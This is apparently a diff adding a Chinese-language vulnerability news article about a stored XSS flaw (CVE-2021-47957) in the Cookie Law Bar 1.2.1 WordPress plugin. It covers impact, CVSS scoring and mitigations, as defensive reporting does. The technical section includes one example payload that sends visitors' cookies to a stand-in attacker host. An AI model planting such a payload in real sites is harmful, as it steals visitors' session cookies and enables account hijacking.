@@ -1,0 +1,56 @@
+---
+title: Cookie Law Bar 1.2.1 存储型 XSS 使 Cookie 被盗
+slug: 2026-05-17-cookie-law-bar-1-2-1-stored-xss-enables-cookie-theft
+date: '2026-05-17'
+excerpt: >-
+  CVE-2021-47957 (CVSS 6.4) 在 Cookie Law Bar 1.2.1 中允许经过身份验证的攻击者通过 Bar Message
+  字段注入持久性脚本，影响所有 WordPress 网站访问者。
+category: vulnerabilities
+tags:
+  - wordpress
+  - stored-xss
+  - cve-2021-47957
+  - cookie-law-bar
+  - plugin-vulnerability
+language: zh
+source_urls:
+  - 'https://wordpress.org/plugins/cookie-law-bar/'
+author: ZCyberNews
+draft: false
+locale_pair: 2026-05-17-cookie-law-bar-1-2-1-stored-xss-enables-cookie-theft
+cluster_key: 'cve:CVE-2021-47957'
+source_count: 1
+severity: medium
+cvss_score: 6.4
+cve_ids:
+  - CVE-2021-47957
+affected_sectors:
+  - web hosting
+  - e-commerce
+  - publishing
+publish_tier: public
+---
+## 执行摘要
+
+WordPress插件Cookie Law Bar版本1.2.1中存在一个存储型跨站脚本（XSS）漏洞，允许经过身份验证的攻击者通过插件的设置界面注入持久的JavaScript负载。该漏洞被追踪为CVE-2021-47957，CVSS评分为6.4（中等严重性），漏洞存在于Bar Message字段中，该字段在将用户输入渲染到网站前端之前未能对其进行清理。任何访问运行该漏洞插件的网站的访客都可能执行攻击者的脚本，从而实现会话劫持、Cookie盗窃和数据泄露。根据国家漏洞数据库（NVD）记录，自披露以来，该插件尚未收到安全更新。
+
+## 技术分析
+
+漏洞存在于插件的管理员设置页面中，具体是标记为“Bar Message”的文本输入字段。该字段接受任意文本，插件将其显示为WordPress网站前端的合规通知横幅。NVD条目CVE-2021-47957显示，通过此字段提交的输入在存储到数据库并随后在浏览器中渲染之前，未进行清理或编码。
+
+拥有WordPress管理面板经过身份验证访问权限的攻击者——通常是订阅者级别的用户或更高级别，具体取决于网站的配置——可以制作一个负载，例如`<script>document.location='https://attacker.example.com/steal.php?c='+document.cookie</script>`，并将其保存为条消息。该脚本在所有后续页面加载中为所有访客执行，包括未经身份验证的用户。由于负载存储在服务器端，它跨会话持久存在，并可能随时间影响大量受害者。
+
+CVSS 6.4评分反映了低攻击复杂性（基于网络，无特殊条件）和对插件设置经过身份验证访问的需求。范围已更改，因为受影响的组件（管理员设置）影响不同的安全范围（面向公众的网站）。攻击者可以利用存储的XSS窃取认证Cookie，将用户重定向到网络钓鱼页面，或在WordPress会话上下文中代表受害者执行操作。
+
+截至本文撰写时，尚无概念验证漏洞代码在公共存储库中发布，但鉴于未清理的输入字段，该漏洞很容易复现。根据WordPress插件目录列表，插件的最后一次更新是在2021年，供应商尚未发布修补版本。
+
+## 缓解措施与建议
+
+运行Cookie Law Bar 1.2.1的网站管理员应立即禁用并从他们的WordPress安装中移除该插件。没有可用的修补版本，插件似乎已被遗弃——WordPress插件目录显示自漏洞披露以来没有更新。作为替代方案，管理员可以使用积极维护的替代GDPR合规Cookie同意插件，如Complianz或Cookie Notice for GDPR。
+
+无法立即替换插件的防御者应限制对插件设置页面的管理员访问权限，仅限于具有`manage_options`能力的可信用户。此外，部署一个Web应用程序防火墙（WAF）规则，阻止POST请求中的`<script>`标签到`wp-admin/admin-post.php`可能提供部分缓解，尽管这不是一个完整的解决方案。定期审计WordPress用户角色并删除不必要的账户，减少了经过身份验证的攻击的攻击面。
+
+## 参考资料
+
+- 国家漏洞数据库：[CVE-2021-47957详情](https://nvd.nist.gov/vuln/detail/CVE-2021-47957)
+- WordPress插件目录：[Cookie Law Bar](https://wordpress.org/plugins/cookie-law-bar/)
